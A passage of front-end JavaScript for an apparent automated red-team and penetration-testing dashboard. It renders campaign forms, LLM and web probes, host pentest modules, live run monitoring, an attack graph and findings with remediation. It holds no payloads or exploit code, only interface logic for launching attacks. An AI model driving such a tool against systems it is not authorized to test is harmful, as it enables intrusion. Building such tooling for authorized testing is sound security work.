  main().querySelectorAll("[data-del]").forEach(b=>b.onclick=async()=>{
    await api("/campaigns/"+b.dataset.del,{method:"DELETE"}); viewCampaigns(); });
  main().querySelectorAll("[data-run]").forEach(b=>b.onclick=async()=>{
    try{ const r=await api(`/campaigns/${b.dataset.run}/run?lang=${I18N.getLang()}`,{method:"POST"});
      toast(t("toast.runStarted")); openRun(r.run_id); }
    catch(e){ toast("⚠ "+e.message); }});
}

function campaignForm(ts, existing){
  if(!ts.length){ toast(t("toast.addTarget")); return; }
  const ed = existing && existing.id;
  const strat = Object.keys(S.meta.strategies).map(k=>`<option value="${k}">${esc(strategyLabel(k))}</option>`).join("");
  const topts = ts.map(x=>`<option value="${x.id}" data-kind="${x.kind}">${esc(x.name)}${x.authorized?"":t("notAuthorized")}</option>`).join("");
  openDrawer(`<h2>${ed?t("campaignForm.editTitle"):t("campaignForm.title")}</h2>
    <label>${t("campaignForm.name")}</label><input id="c-name" placeholder="${t("campaignForm.namePh")}">
    <label>${t("campaignForm.target")}</label><select id="c-target" ${ed?"disabled":""}>${topts}</select>
    <div id="strat-wrap"><label>${t("campaignForm.strategy")}</label><select id="c-strat">${strat}</select>
    <label>${t("campaignForm.maxTurns")}</label><input id="c-turns" type="number" value="4" min="1" max="8"></div>
    <label>${t("campaignForm.cookies")} <span class="no" style="font-weight:400">${t("campaignForm.cookiesHint")}</span></label>
    <textarea id="c-cookies" rows="3" placeholder="${t("campaignForm.cookiesPh")}" style="font-family:var(--mono);font-size:12px"></textarea>
    <label>${t("login.section")} <span class="no" style="font-weight:400">${t("login.hint")}</span></label>
    <select id="c-login-mode">
      <option value="">${t("login.off")}</option>
      <option value="form">${t("login.modeForm")}</option>
      <option value="json">${t("login.modeJson")}</option>
      <option value="bearer">${t("login.modeBearer")}</option>
    </select>
    <div id="login-fields" style="display:none;gap:8px;margin-top:8px">
      <input id="c-login-url" placeholder="${t("login.url")}">
      <div class="row" style="gap:8px">
        <input id="c-login-user" placeholder="${t("login.user")}" autocomplete="off">
        <input id="c-login-pass" type="password" placeholder="${t("login.pass")}" autocomplete="new-password">
      </div>
      <div class="row" style="gap:8px;align-items:center">
        <button type="button" id="c-login-test" class="ghost">${t("login.test")}</button>
        <span id="login-test-out" class="no" style="font-size:12px"></span>
        <span id="login-adv-toggle" class="no" style="margin-left:auto;cursor:pointer;text-decoration:underline">${t("login.advanced")} ▾</span>
      </div>
      <div id="login-adv" style="display:none;gap:8px;margin-top:6px">
        <div class="no" style="font-size:12px">${t("login.advHint")}</div>
        <div class="row" style="gap:8px">
          <input id="c-login-uf" placeholder="${t("login.userField")}" style="font-family:var(--mono);font-size:12px">
          <input id="c-login-pf" placeholder="${t("login.passField")}" style="font-family:var(--mono);font-size:12px">
        </div>
        <input id="c-login-token" placeholder="${t("login.tokenPath")}" style="font-family:var(--mono);font-size:12px;display:none">
      </div>
    </div>
    <label>${t("campaignForm.probes")} <span id="probe-domain" class="no"></span></label>
    <div id="probe-list" style="display:grid;gap:8px"></div>
    <div class="row" style="margin-top:18px"><button id="c-save">${ed?t("common.save"):t("campaignForm.create")}</button>
      <button class="ghost" onclick="closeDrawer()">${t("common.cancel")}</button></div>`);
  const renderProbes=()=>{
    const opt=$("#c-target").selectedOptions[0];
    const kind=opt?opt.dataset.kind:"http_chat";
    let html="";
    if(kind==="host"){
      $("#probe-domain").textContent=t("domain.host");
      $("#strat-wrap").style.display="none";
      html=(S.meta.pentest_modules||[]).map(m=>`
        <label class="probe" data-p="${m.id}">
          <input type="checkbox" value="${m.id}" checked>
          <div><div class="pn">${esc(moduleName(m))}
            <span class="tag">${esc(phaseLabel(m.phase))}</span> <span class="tag">${m.tool}</span></div></div>
        </label>`).join("");
    } else {
      const cat = kind==="web_app" ? "web" : "llm";
      $("#probe-domain").textContent = cat==="web" ? t("domain.web") : t("domain.llm");
      $("#strat-wrap").style.display = cat==="web" ? "none" : "block";
      html=S.meta.probes.filter(p=>p.category===cat).map(p=>`
        <label class="probe" data-p="${p.id}">
          <input type="checkbox" value="${p.id}" checked>
          <div><div class="pn">${esc(probeName(p))} <span class="badge sev-${p.severity}">${sevLabel(p.severity)}</span>
            <span class="tag">${p.owasp}</span> <span class="tag">${p.mitre}</span></div>
          <div class="pd">${esc(probeDesc(p))}${p.requires_tools?t("probe.needsTools"):""}</div></div>
        </label>`).join("");
    }
    $("#probe-list").innerHTML=html;
    $("#probe-list").querySelectorAll(".probe").forEach(p=>{ const cb=p.querySelector("input");
      const s=()=>p.classList.toggle("on",cb.checked); cb.onchange=s; s(); });
  };
  if(ed){   // prefill from the existing campaign (target is fixed on edit)
    $("#c-name").value = existing.name||"";
    $("#c-target").value = existing.target_id;
    if(existing.orchestrator) $("#c-strat").value = existing.orchestrator;
    if(existing.max_turns) $("#c-turns").value = existing.max_turns;
    $("#c-cookies").value = existing.session_cookies||"";
    $("#c-login-mode").value = existing.login_mode||"";
    $("#c-login-url").value = existing.login_url||"";
    $("#c-login-user").value = existing.login_user||"";
    $("#c-login-uf").value = existing.login_user_field||"";
    $("#c-login-pf").value = existing.login_pass_field||"";
    $("#c-login-token").value = existing.login_token_path||"";
    if(existing.has_login_password) $("#c-login-pass").placeholder = t("login.passSaved");
  }
  // Auto-login: show fields only when a mode is picked. Field-name overrides live
  // under an "advanced" fold; bearer needs the token path, so it opens it.
  const syncLogin=()=>{ const m=$("#c-login-mode").value;
    $("#login-fields").style.display = m ? "grid" : "none";
    $("#c-login-token").style.display = m==="bearer" ? "block" : "none";
    if(m==="bearer") $("#login-adv").style.display = "grid"; };
  $("#login-adv-toggle").onclick=()=>{ const a=$("#login-adv");
    a.style.display = a.style.display==="none" ? "grid" : "none"; };
  $("#c-login-mode").onchange=syncLogin; syncLogin();
  $("#c-login-test").onclick = async () => {
    const out=$("#login-test-out"); out.textContent=t("login.testing"); out.className="no";
    try{
      const r=await api("/campaigns/test-login",{method:"POST",body:JSON.stringify(loginBody(true))});
      out.textContent = (r.ok?"✓ ":"✗ ") + (r.diag||"");
      out.className = r.ok ? "ok" : "no";
    }catch(e){ out.textContent="⚠ "+e.message; out.className="no"; }
  };
  const loginBody=(withTarget)=>{ const b={
    login_mode:$("#c-login-mode").value||"", login_url:$("#c-login-url").value||"",
    login_user:$("#c-login-user").value||"", login_password:$("#c-login-pass").value||"",
    login_user_field:$("#c-login-uf").value||"username", login_pass_field:$("#c-login-pf").value||"password",
    login_token_path:$("#c-login-token").value||"token" };
    if(withTarget && $("#c-target").value) b.target_id=+$("#c-target").value;
    return b; };
  const applyChecks=()=>{ if(!ed) return;
    $("#probe-list").querySelectorAll(".probe input").forEach(cb=>{
      cb.checked=(existing.probes||[]).includes(cb.value); cb.dispatchEvent(new Event("change")); }); };
  const render=()=>{ renderProbes(); applyChecks(); };
  $("#c-target").onchange=render; render();
  $("#c-save").onclick = async () => {
    const chosen=[...$("#probe-list").querySelectorAll("input:checked")].map(i=>i.value);
    if(!chosen.length){ toast(t("toast.pickModule")); return; }
    const kind=($("#c-target").selectedOptions[0]||{}).dataset?.kind;
    const body={ name:$("#c-name").value||"Untitled", probes:chosen,
      orchestrator:$("#c-strat").value, session_cookies:$("#c-cookies").value||"",
      max_turns: kind==="host" ? 12 : +($("#c-turns").value||4), ...loginBody(false) };
    if(!ed) body.target_id=+$("#c-target").value;
    try{
      await api(ed?`/campaigns/${existing.id}`:"/campaigns",
                {method: ed?"PATCH":"POST", body:JSON.stringify(body)});
      closeDrawer(); viewCampaigns(); toast(ed?t("toast.campaignUpdated"):t("toast.campaignCreated")); }
    catch(e){ toast(e.message); }
  };
}

/* ---------- runs ---------- */
async function viewRuns(){
  const rs = await api("/runs");
  main().innerHTML = `<h1>${t("runs.title")}</h1><p class="lead">${t("runs.lead")}</p>
    <div class="panel">${runsTable(rs)}</div>`;
  bindRunRows();
}
function runsTable(rs){
  if(!rs||!rs.length) return `<div class="empty">${t("runs.empty")}</div>`;
  return `<table><thead><tr><th>${t("col.run")}</th><th>${t("col.status")}</th><th>${t("col.attempts")}</th>
    <th>${t("col.successes")}</th><th>${t("col.worst")}</th><th>${t("col.tokens")}</th><th>${t("col.cost")}</th>
    <th>${t("col.started")}</th></tr></thead><tbody>
    ${rs.map(r=>{const s=r.summary||{};const u=s.usage||{};return `<tr data-run="${r.id}" style="cursor:pointer">
      <td><b>#${r.id}</b></td>
      <td><span class="status ${r.status}">${r.status==="running"?'<span class="spin"></span> ':''}${statusLabel(r.status)}</span></td>
      <td>${s.attempts??"—"}</td><td>${s.successes??"—"}</td>
      <td>${s.worst?`<span class="badge sev-${s.worst}">${sevLabel(s.worst)}</span>`:"—"}</td>
      <td class="mono" style="font-size:12px">${u.total_tokens?u.total_tokens.toLocaleString():"—"}</td>
      <td>${u.cost_usd?`<span class="ucost">~$${u.cost_usd.toFixed(4)}</span>`:"—"}</td>
      <td class="no">${fmtDate(r.started_at)}</td></tr>`;}).join("")}
    </tbody></table>`;
}
function bindRunRows(){ main().querySelectorAll("[data-run]").forEach(tr=>
  tr.onclick=()=>openRun(tr.dataset.run)); }

/* ---------- run detail (live) ---------- */
async function openRun(id){
  clearInterval(S.pollTimer); S.view = "runs";
  const paint = async () => {
    let d; try{ d = await api("/runs/"+id); }catch{ return; }
    renderRun(d);
    if(!["running","queued"].includes(d.run.status)) clearInterval(S.pollTimer);
  };
  await paint();
  S.pollTimer = setInterval(paint, 1500);
}
function renderRun(d){
  const r=d.run, s=r.summary||{};
  const live = ["running","queued"].includes(r.status);
  const plan=d.attempts.find(a=>a.phase==="plan");
  const report=d.attempts.find(a=>a.phase==="report");
  const validation=d.attempts.find(a=>a.phase==="validate");
  const steps=d.attempts.filter(a=>!["plan","report","validate"].includes(a.phase));
  main().innerHTML = `
    <div class="spread"><div><h1>${t("run.title")} #${r.id} <span class="status ${r.status}">
      ${live?'<span class="spin"></span> ':''}${statusLabel(r.status)}</span></h1>
      <p class="lead">${t("run.summary",{a:s.attempts||0,s:s.successes||0})}${usageInline(s.usage)}</p></div>
      <div class="row">${live?`<button class="danger" id="stop">${t("common.stop")}</button>`:""}
      <button class="ghost" id="back-runs">${t("common.back")}</button></div></div>
    ${r.error?`<div class="warn">${t("run.error")}: ${esc(r.error)}</div>`:""}
    ${plan?playbookPanel(t("run.playbook"),plan):""}
    <div class="panel"><h3>${t("run.graphTitle")}</h3>
      <div id="graph"></div>
      <p class="no" style="font-size:12px;margin-top:8px">${t("run.graphNote")}</p></div>
    <div class="panel"><h3>${t("run.findingsTitle",{n:dedupFindings(d.findings).length})}</h3>
      <div class="scrollbox">${findingsList(d.findings)}</div></div>
    <div class="panel"><h3>${t("run.phasesTitle")}</h3>${phaseGroups(steps)}</div>
    ${validation?playbookPanel(t("run.validation"),validation):""}
    ${report?playbookPanel(t("run.execSummary"),report):""}`;
  $("#back-runs").onclick=()=>show("runs");
  if(live) $("#stop").onclick=async()=>{ await api(`/runs/${r.id}/stop`,{method:"POST"}); toast(t("common.stop")+"…"); };
  AttackGraph.render($("#graph"), {attempts:steps, targetName:t("monitor.target"),
    phaseLabel:(k)=>phaseLabel(k), techLabel:(x)=>techLabel(x),
    findingLabel:t("result.finding"), cleanLabel:t("result.clean"), emptyLabel:t("run.noAttempts")},
    (grp)=>openAttempt(grp.find(a=>a.success)||grp[0]));
  main().querySelectorAll("[data-att]").forEach(tr=>tr.onclick=()=>{
    openAttempt(d.attempts.find(a=>a.id==tr.dataset.att)); });
  main().querySelectorAll("[data-find]").forEach(c=>c.onclick=()=>{
    openFinding(d.findings.find(x=>x.id==c.dataset.find)); });
}
function playbookPanel(title, a){
  const s=(a.steps&&a.steps[0])||{};
  return `<div class="panel"><h3>${esc(title)} ${aiBadge()}</h3>
    ${s.note?`<div class="pb-note">${esc(s.note)}</div>`:""}
    <div class="md playbook">${mdToHtml(s.response||"")}</div></div>`;
}
const PHASE_ORDER=["recon","fingerprint","discovery","vuln","exploit"];
function phaseGroups(as){
  if(!as.length) return `<div class="empty">${t("run.noAttempts")}</div>`;
  const groups={};
  as.forEach(a=>{ (groups[a.phase||"_"]=groups[a.phase||"_"]||[]).push(a); });
  const order=[...PHASE_ORDER,"_"].filter(p=>groups[p]);
  Object.keys(groups).forEach(p=>{ if(!order.includes(p)) order.push(p); });
  return order.map(p=>{
    const items=groups[p]; if(!items) return "";
    const label = p==="_" ? t("run.attemptsTitle") : phaseLabel(p);
    const hits=items.filter(a=>a.success).length;
    return `<div class="phase">
      <div class="phase-head"><span class="dot"></span>${esc(label)}
        <span class="ln"></span><span>${items.length}${hits?` · ${hits}✓`:""}</span></div>
      ${items.map(atkRow).join("")}</div>`;
  }).join("");
}
function atkRow(a){
  const s0=(a.steps&&a.steps[0])||{};
  const sub=(a.rationale||s0.prompt||"").slice(0,150);
  return `<div class="atk ${a.success?"ok":""}" data-att="${a.id}">
    <span class="ti"><div class="tn">${kindBadge(a)} ${esc(techLabel(a.technique))}
      ${a.success?`<span class="badge sev-${a.severity}">${t("result.finding")}</span>`
                 :`<span class="no" style="font-size:11px">${t("result.clean")}</span>`}
      ${a.owasp?`<span class="tag">${a.owasp}</span>`:""}${a.atlas?`<span class="tag">${a.atlas}</span>`:""}</div>
      ${sub?`<div class="tc">${esc(sub)}</div>`:""}</span>
    <span class="chev">›</span></div>`;
}
/* Group findings by issue class (title prefix before ":"/"—" + owasp + severity)
   so many near-identical findings (e.g. dozens of "Sensitive path exposed: /X")
   collapse to one row with an ×N count, instead of flooding the list. */
const _findClass = f => (f.title||"").split(/[:：—]/)[0].trim();
function dedupFindings(fs){
  const seen={}, out=[];
  (fs||[]).forEach(f=>{
    const k=_findClass(f).toLowerCase()+"|"+(f.owasp||"")+"|"+(f.severity||"");
    if(seen[k]) seen[k].n++; else { seen[k]={f,n:1}; out.push(seen[k]); }
  });
  return out;
}
function findingsList(fs){
  if(!fs.length) return `<div class="empty">${t("run.noFindings")}</div>`;
  const uniq=dedupFindings(fs).sort((a,b)=>sevScore(b.f.severity)-sevScore(a.f.severity));
  return uniq.map(({f,n})=>{
    const title=n>1?_findClass(f):f.title;
    return `<div class="step" data-find="${f.id}" style="cursor:pointer">
      <div class="sh"><span><span class="badge sev-${f.severity}">${sevLabel(f.severity)}</span>
        ${cvssChip(f)}<b style="margin-left:8px">${esc(title)}</b>${n>1?`<span class="tag" style="margin-left:6px">×${n}</span>`:""}</span>
        <span>${cweChip(f)}${f.owasp?`<span class="tag">${f.owasp}</span>`:""}</span></div></div>`;
  }).join("");
}
function attemptsTable(as){
  if(!as.length) return `<div class="empty">${t("run.noAttempts")}</div>`;
  const hasPhase = as.some(a=>a.phase);
  return `<table><thead><tr>${hasPhase?`<th>${t("col.phase")}</th>`:''}<th>${t("col.technique")}</th>
    <th>${t("col.owasp")}</th><th>${t("col.mitre")}</th><th>${t("col.result")}</th><th>${t("col.steps")}</th></tr></thead><tbody>
    ${as.map(a=>`<tr data-att="${a.id}" style="cursor:pointer">
      ${hasPhase?`<td><span class="tag">${esc(phaseLabel(a.phase)||'–')}</span></td>`:''}
      <td class="mono" style="font-size:12px">${esc(a.technique)}</td>
      <td>${a.owasp?`<span class="tag">${a.owasp}</span>`:'–'}</td>
      <td>${a.atlas?`<span class="tag">${a.atlas}</span>`:'–'}</td>
      <td>${a.success?`<span class="badge sev-${a.severity}">${t("result.finding")}</span>`:`<span class="no">${t("result.clean")}</span>`}</td>
      <td>${a.steps.length}</td></tr>`).join("")}
    </tbody></table>`;
}

/* ---------- live monitor ---------- */
async function viewMonitor(){
  clearInterval(S.pollTimer);
  const [rs, cs, ts] = await Promise.all([api("/runs"), api("/campaigns"), api("/targets")]);
  if(!rs.length){ main().innerHTML =
    `<h1>${t("monitor.title")}</h1><p class="lead">${t("monitor.lead")}</p>
     <div class="panel"><div class="empty">${t("monitor.noRun")}</div></div>`; return; }
  const cmap=Object.fromEntries(cs.map(c=>[c.id,c])), tmap=Object.fromEntries(ts.map(x=>[x.id,x]));
  const active = rs.find(r=>["running","queued"].includes(r.status)) || rs[0];
  let lastSig = "";
  const paint = async () => {
    let d; try{ d = await api("/runs/"+active.id); }catch{ return; }
    // Only re-render when something actually changed, so the feed/graph don't
    // flicker and re-scroll every second while nothing new is happening.
    const sig = d.run.status + ":" + d.attempts.length + ":" +
                d.attempts.reduce((n,a)=>n+a.steps.length,0) + ":" + I18N.getLang() + ":" + Theme.getTheme();
    if (sig !== lastSig) { lastSig = sig; renderMonitor(d, cmap, tmap); }
    if(!["running","queued"].includes(d.run.status)) clearInterval(S.pollTimer);
  };
  await paint();
  S.pollTimer = setInterval(paint, 1500);
}
function renderMonitor(d, cmap, tmap){
  const r=d.run, live=["running","queued"].includes(r.status);
  const camp=cmap[r.campaign_id]||{}, tgt=tmap[camp.target_id]||{};
  const attempts=d.attempts||[];
  const lat=[];
  attempts.forEach(a=>a.steps.forEach(st=>lat.push(st.latency_ms||0)));
  const done=attempts.length, succ=attempts.filter(a=>a.success).length;
  const rate=done?Math.round(succ/done*100):0;
  const avg=lat.length?Math.round(lat.reduce((x,y)=>x+y,0)/lat.length):0;
  const last=attempts[attempts.length-1];
  const cur = live && last ? (phaseLabel(last.phase)||last.technique||last.probe) : "—";
  main().innerHTML = `
    <div class="mon-head">
      <h1 style="margin:0">${t("monitor.title")}</h1>
      ${live?`<span class="live-dot"></span><span class="live-tag">${t("monitor.live")}</span>`
            :`<span class="status ${r.status}">${statusLabel(r.status)}</span>`}
      <span class="tag">#${r.id}</span>
      <span class="no" style="font-size:12px">${t("monitor.target")}: <b>${esc(tgt.name||"—")}</b> ·
        ${t("monitor.strategy")}: <b>${esc(strategyLabel(camp.orchestrator||"single_turn"))}</b>${usageInline((r.summary||{}).usage)}</span>
      <a class="no" id="mon-open" style="margin-left:auto;font-size:12px">${t("monitor.viewFull")}</a>
    </div>
    <p class="lead">${live?t("monitor.lead"):t("monitor.idle")}</p>
    <div class="mon-tiles">
      <div class="mtile"><div class="mv">${done}<span class="no" style="font-size:14px"> / ${succ}✓</span></div>
        <div class="ml">${t("monitor.throughput")}</div></div>
      <div class="mtile"><div class="mv" style="color:${rate?'var(--crit)':'var(--ink)'}">${rate}%</div>
        <div class="ml">${t("monitor.successRate")}</div></div>
      <div class="mtile"><div class="mv">${avg}<span class="no" style="font-size:14px"> ms</span></div>
        <div class="ml">${t("monitor.avgLatency")}</div></div>
      <div class="mtile"><div class="mv sm">${esc(cur)}</div><div class="ml">${t("monitor.currentProbe")}</div></div>
    </div>
    <div class="mon-grid">
      <div class="panel mon-graph-panel"><h3>${t("run.graphTitle")}</h3><div id="mon-graph"></div></div>
      <div class="panel mon-feed-panel">
        <div class="mon-feed-head"><h3>${t("monitor.liveFeed")}</h3>
          <span class="mon-lat">${t("monitor.latencyTrend")} ${sparkInline(lat)}</span></div>
        <div class="feed">${feedHtml(attempts)}</div></div>
    </div>`;
  $("#mon-open").onclick=()=>openRun(r.id);
  AttackGraph.render($("#mon-graph"), {attempts, targetName:tgt.name||t("monitor.target"),
    endpoint:tgt.endpoint||"", phaseLabel:(k)=>phaseLabel(k), techLabel:(x)=>techLabel(x),
    findingLabel:t("result.finding"), cleanLabel:t("result.clean"), emptyLabel:t("run.noAttempts")},
    (grp)=>openAttempt(grp.find(a=>a.success)||grp[0]));
}
function sparkline(vals){
  if(!vals.length) return `<div class="no" style="font-size:12px;padding:16px 0">${t("monitor.waiting")}</div>`;
  const W=100, H=70, max=Math.max(...vals,1), n=vals.length;
  const pts=vals.map((v,i)=>`${n<2?0:(i/(n-1)*W).toFixed(1)},${(H-v/max*(H-8)-4).toFixed(1)}`).join(" ");
  const last=vals[vals.length-1];
  return `<svg class="spark" viewBox="0 0 ${W} ${H}" preserveAspectRatio="none">
    <polyline points="${pts}" fill="none" stroke="var(--accent)" stroke-width="1.6" vector-effect="non-scaling-stroke"/>
    <circle cx="${n<2?0:W}" cy="${(H-last/max*(H-8)-4).toFixed(1)}" r="2.4" fill="var(--accent)"/>
  </svg><div class="no" style="font-size:11px">max ${max} ms · last ${last} ms · ${n} steps</div>`;
}
/* Compact inline sparkline (no caption) for the feed header. */
function sparkInline(vals){
  if(vals.length<2) return "";
  const W=64,H=16,max=Math.max(...vals,1),n=vals.length;
  const pts=vals.slice(-40).map((v,i,arr)=>`${(i/(arr.length-1)*W).toFixed(1)},${(H-v/max*(H-2)-1).toFixed(1)}`).join(" ");
  return `<svg class="spark-i" viewBox="0 0 ${W} ${H}" preserveAspectRatio="none" aria-hidden="true">
    <polyline points="${pts}" fill="none" stroke="var(--accent)" stroke-width="1.4" vector-effect="non-scaling-stroke"/></svg>`;
}
/* One concise row per attempt (not per step — multi-step attempts shared one
   rationale and showed it repeatedly). Whitespace collapsed, kept short. */
function feedHtml(attempts){
  if(!attempts.length) return `<div class="no" style="font-size:12px;padding:10px 0">${t("monitor.waiting")}</div>`;
  return attempts.slice().reverse().slice(0,60).map(a=>{
    const ms=(a.steps||[]).reduce((n,s)=>n+(s.latency_ms||0),0);
    const raw=a.rationale||((a.steps||[])[0]||{}).response||((a.steps||[])[0]||{}).prompt||"";
    const txt=esc(raw.replace(/\s+/g," ").trim().slice(0,130));
    return `<div class="fev ${a.success?"ok":""}">
      <div class="fh"><span class="fh-l">${kindBadge(a)} ${phaseChip(a)} <span class="mono">${esc(techLabel(a.technique))}</span></span>
        <span class="fh-r">${ms?ms+" ms":""}${a.success?` · <b style="color:var(--crit)">${t("monitor.exploited")}</b>`:""}</span></div>
      ${txt?`<div class="fp">${txt}</div>`:""}
      ${a.success&&isExploit(a)&&impactOf(a)?`<div class="fimp">▶ ${esc(impactOf(a))}</div>`:""}</div>`;
  }).join("");
}

/* ---------- settings (LLM config) ---------- */
async function viewSettings(){
  const cfg = await api("/settings/llm");
  const prov = p => `<option value="${p}" ${cfg.provider===p?"selected":""}>${t("settings.provider"+p[0].toUpperCase()+p.slice(1))}</option>`;
  main().innerHTML = `
    <h1>${t("settings.title")}</h1><p class="lead">${t("settings.lead")}</p>
    <div class="grid2">
      <div class="panel"><h3>${t("settings.llmTitle")}</h3>
        <label>${t("settings.provider")}</label>
        <select id="s-prov">${prov("offline")}${prov("openai")}${prov("azure")}${prov("anthropic")}</select>
        <div id="s-azure-note" class="note" style="margin:10px 0 0;display:none">${t("settings.azureHint")}</div>
        <div id="s-online">
          <label>${t("settings.baseUrl")}</label>
          <input id="s-base" value="${esc(cfg.base_url||"")}" placeholder="https://api.openai.com/v1">
          <div class="no" style="font-size:11px;margin-top:3px">${t("settings.baseUrlHint")}</div>
          <label>${t("settings.model")}</label>
          <input id="s-model" value="${esc(cfg.model||"")}" placeholder="gpt-4o-mini">
          <div class="no" style="font-size:11px;margin-top:3px">${t("settings.modelHint")}</div>
          <div id="s-apiver-wrap" style="display:none">
            <label>${t("settings.apiVersion")}</label>
            <input id="s-apiver" value="${esc(cfg.api_version||"")}" placeholder="2024-10-21">
            <div class="no" style="font-size:11px;margin-top:3px">${t("settings.apiVersionHint")}</div>
          </div>
          <label>${t("settings.apiKey")} <span class="no">· ${cfg.has_api_key?t("settings.apiKeySet"):t("settings.apiKeyNone")}</span></label>
          <input id="s-key" type="password" placeholder="${cfg.has_api_key?"••••••••••":"sk-…"}">
          <div class="no" style="font-size:11px;margin-top:3px">${t("settings.apiKeyHint")}</div>
        </div>
        <div class="row" style="margin-top:18px">
          <button id="s-save">${t("settings.save")}</button>
          <button class="ghost" id="s-test">${t("settings.test")}</button></div>
        <div id="s-status" class="note" style="margin-top:14px"></div>
      </div>
      <div class="panel"><h3>${t("settings.roleTitle")}</h3>
        <p class="no" style="font-size:13px;line-height:1.7">${t("settings.roleNote")}</p>
        <div class="note">${t("settings.source")}: <b>${cfg.source==="console"?t("settings.srcConsole"):t("settings.srcEnv")}</b></div>
      </div>
    </div>`;
  const statusEl=$("#s-status");
  const paintStatus = online => { statusEl.innerHTML =
    (online?`<span class="ok">● </span>${t("settings.online")}`:`<span class="no">○ </span>${t("settings.offlineMode")}`); };
  const syncProv=()=>{ const v=$("#s-prov").value, off=v==="offline";
    $("#s-online").style.display=off?"none":"block";
    $("#s-azure-note").style.display=v==="azure"?"block":"none";
    $("#s-apiver-wrap").style.display=v==="azure"?"block":"none";
    paintStatus(!off && (cfg.has_api_key||$("#s-base").value)); };
  $("#s-prov").onchange=syncProv; syncProv();
  $("#s-save").onclick=async()=>{
    const body={provider:$("#s-prov").value, base_url:$("#s-base")?$("#s-base").value:"",
      model:$("#s-model")?$("#s-model").value:"",
      api_version:$("#s-apiver")?$("#s-apiver").value:""};
    const k=$("#s-key")?$("#s-key").value:""; if(k) body.api_key=k;
    try{ const res=await api("/settings/llm",{method:"PUT",body:JSON.stringify(body)});
      S.meta.llm=res; refreshAttackerPill(); paintStatus(res.online);
      toast(t("settings.saved")); viewSettings(); }
    catch(e){ toast(e.message); }
  };
  $("#s-test").onclick=async()=>{
    const btn=$("#s-test"); btn.disabled=true; btn.textContent=t("settings.testing");
    statusEl.textContent="…";
    try{ const res=await api("/settings/llm/test",{method:"POST"});
      if(res.ok&&res.online) statusEl.innerHTML=`<span class="ok">✔ </span>${t("settings.testOk",{ms:res.latency_ms,model:esc(res.model)})}`;
      else if(!res.online) paintStatus(false);
      else statusEl.innerHTML=`<span style="color:var(--crit)">✘ </span>${t("settings.testFail")}: ${esc(res.detail||"")}`;
    }catch(e){ statusEl.textContent=e.message; }
    finally{ btn.disabled=false; btn.textContent=t("settings.test"); }
  };
}

/* ---------- drawers ---------- */
function openAttempt(a){
  if(!a) return;
  const steps = a.steps.map(s=>`
    <div class="step"><div class="sh"><span>${stepKindBadge(s.role)} ${t("attempt.step")} ${s.idx+1} · ${esc(s.role)}</span>
      <span>${s.latency_ms} ms</span></div>
      <div class="io"><div class="lab">▸ ${esc(s.note||t("attempt.attackPrompt"))}</div>
        <pre>${esc(s.prompt)}</pre>
        <div class="lab">${t("attempt.targetResponse")}</div>
        <pre class="resp">${esc(s.response)}</pre></div></div>`).join("");
  openDrawer(`<span class="close-x" onclick="closeDrawer()">×</span>
    <h2>${a.success?"✔ ":""}${esc(techLabel(a.probe||a.technique))}</h2>
    <div class="row" style="gap:8px;margin-bottom:10px">
      ${kindBadge(a)}
      <span class="badge sev-${a.severity}">${sevLabel(a.severity)}</span>
      ${a.phase?`<span class="tag">${esc(phaseLabel(a.phase))}</span>`:""}
      ${a.owasp?`<span class="tag">${a.owasp}</span>`:""}${a.atlas?`<span class="tag">${a.atlas}</span>`:""}
      <span class="tag">score ${(a.score*10).toFixed(1)}</span></div>
    ${isExploit(a)?exploitCard(a):""}
    <p class="no" style="font-size:13px"><b>${t("attempt.objective")}:</b> ${esc(a.objective)}</p>
    ${a.rationale?`<div class="lab" style="margin-top:12px">${t("attempt.conclusion")}</div>
      <div class="md conclusion">${mdToHtml(a.rationale)}</div>`:""}
    ${a.evidence?`<div class="lab">${t("attempt.evidence")}</div><div class="evidence">${esc(a.evidence)}</div>`:""}
    <h3 style="margin-top:18px">${t("attempt.trail",{n:a.steps.length})}</h3>${steps}`);
}
function openFinding(f){
  if(!f) return;
  openDrawer(`<span class="close-x" onclick="closeDrawer()">×</span>
    <h2>${esc(f.title)}</h2>
    <div class="row" style="gap:8px;margin-bottom:12px">
      <span class="badge sev-${f.severity}">${sevLabel(f.severity)}</span>
      ${cvssChip(f)}${cweChip(f)}
      ${f.owasp?`<span class="tag">${f.owasp}</span>`:""}${f.atlas?`<span class="tag">${f.atlas}</span>`:""}</div>
    ${f.cvss_vector?`<div class="evidence mono" style="margin-bottom:12px">${esc(f.cvss_vector)}</div>`:""}
    <div class="lab">${t("finding.description")}</div><div class="md">${mdToHtml(f.description)}</div>
    <div class="lab">${t("finding.evidence")}</div><div class="evidence">${esc(f.evidence)}</div>
    <div class="lab" style="margin-top:14px">${t("finding.remediation")}</div>
    <div class="md">${mdToHtml(f.remediation)}</div>`);
}
function openDrawer(html){ $("#drawer-body").innerHTML=html; $("#drawer").classList.remove("hidden"); }
function closeDrawer(){ $("#drawer").classList.add("hidden"); }
$("#drawer").addEventListener("click",e=>{ if(e.target.id==="drawer") closeDrawer(); });

const sevScore = s => ({critical:5,high:4,medium:3,low:2,info:1}[s]||0);

/* ---------- AI-decision vs tool-run marker ---------- */
const ICON_AI = `<svg class="kic" viewBox="0 0 16 16" width="12" height="12" aria-hidden="true"><path d="M8 1l1.5 3.8L13.5 6l-3.8 1.5L8 11 6.5 7.5 2.5 6l3.9-1.5z" fill="currentColor"/></svg>`;
const ICON_TOOL = `<svg class="kic" viewBox="0 0 16 16" width="12" height="12" aria-hidden="true"><path d="M2.8 4.2l3 3-3 3M8 12h5.2" stroke="currentColor" stroke-width="1.7" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
function kindOf(a){
  if(["plan","report","validate"].includes(a.phase)) return "ai";
  const role=((a.steps&&a.steps[0])||{}).role;
  return (role==="tool"||role==="request") ? "tool" : "ai";
}
const kindBadge = a => (kindOf(a)==="ai")
  ? `<span class="kind ai">${ICON_AI} ${t("kind.ai")}</span>`
  : `<span class="kind tool">${ICON_TOOL} ${t("kind.tool")}</span>`;
const aiBadge = () => `<span class="kind ai">${ICON_AI} ${t("kind.ai")}</span>`;
const stepKindBadge = role => ((role==="tool"||role==="request"))
  ? `<span class="kind tool">${ICON_TOOL} ${t("kind.tool")}</span>`
  : `<span class="kind ai">${ICON_AI} ${t("kind.ai")}</span>`;
/* localize a stored (English) module/probe technique name via meta */
function techLabel(tech){
  if(!S.meta || !zh()) return tech;
  const all=[...(S.meta.pentest_modules||[]),...(S.meta.probes||[])];
  const m=all.find(x=>x.name===tech);
  return (m && m.name_zh) ? m.name_zh : tech;
}
/* phase chip whose dot matches the kill-chain graph node colour */
